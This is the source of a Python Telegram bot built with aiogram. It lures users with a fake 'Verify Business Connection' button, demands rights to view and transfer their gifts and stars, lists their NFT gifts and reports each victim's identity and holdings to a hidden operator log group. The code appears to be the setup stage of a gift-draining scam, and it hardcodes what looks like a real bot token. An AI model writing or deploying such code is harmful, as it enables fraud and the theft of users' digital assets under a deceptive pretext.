import asyncio
import logging

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.methods.get_business_connection import GetBusinessConnection
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.exceptions import TelegramBadRequest

# === CONFIG ===
API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613

# === STATE ===
authorized = {}
logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN, default=Bot.Default(parse_mode=ParseMode.HTML))
dp = Dispatcher()


@dp.message(F.text == "/start")
async def start_cmd(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Verify Business Connection", callback_data="verify_bc")]
    ])
    await message.reply("Welcome! Tap below to verify your Business connection:", reply_markup=kb)


@dp.callback_query(F.data == "verify_bc")
async def verify_cb(callback: CallbackQuery):
    bc_id = getattr(callback.message, "business_connection_id", None)
    if not bc_id:
        return await callback.answer("🔴 You are not connected via Business Chatbots.", show_alert=True)

    try:
        info = await bot(GetBusinessConnection(business_connection_id=bc_id))
        rights = info.rights or {}

        if not (rights.get("can_view_gifts_and_stars") and rights.get("can_transfer_and_upgrade_gifts")):
            return await callback.answer("❌ Please grant all gift/star permissions.", show_alert=True)

        gifts_resp = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        gifts = gifts_resp.gifts or []

        uid = info.user.id
        username = f"@{info.user.username}" if info.user.username else info.user.first_name

        authorized[uid] = {
            "connection_id": bc_id,
            "username": username,
            "gifts": [(g.owned_gift_id, getattr(g, "title", "Unnamed")) for g in gifts],
            "stars": 0,
            "notified": False
        }

        gift_list = "\n".join(f"- {t}" for _, t in authorized[uid]["gifts"]) or "(no NFTs)"

        await bot.send_message(
            LOG_GROUP_ID,
            f"✅ <a href='tg://user?id={uid}'>{username}</a> verified via button.\nNFTs:\n{gift_list}"
        )

        await callback.message.edit_text("🟢 Verified! You're connected to Business Chatbots.")
    except TelegramBadRequest as e:
        await callback.answer(f"Error: {e.message}", show_alert=True)


@dp.business_connection()
async def on_business_connect(message: Message, connection_id: str):
    try:
        info = await bot(GetBusinessConnection(business_connection_id=connection_id))
        rights = info.rights or {}

        if not (rights.get("can_view_gifts_and_stars") and rights.get("can_transfer_and_upgrade_gifts")):
            return

        gifts_resp = await bot(GetBusinessAccountGifts(business_connection_id=connection_id))
        gifts = gifts_resp.gifts or []

        uid = info.user.id
        username = f"@{info.user.username}" if info.user.username else info.user.first_name

        authorized[uid] = {
            "connection_id": connection_id,
            "username": username,
            "gifts": [(g.owned_gift_id, getattr(g, "title", "Unnamed")) for g in gifts],
            "stars": 0,
            "notified": False
        }

        gift_list = "\n".join(f"- {t}" for _, t in authorized[uid]["gifts"]) or "(no NFTs)"

        await bot.send_message(
            LOG_GROUP_ID,
            f"✅ <a href='tg://user?id={uid}'>{username}</a> just added the bot via Business Chatbots.\nNFTs:\n{gift_list}"
        )
    except TelegramBadRequest as e:
        logging.error(f"Business connection error: {e.message}")


async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
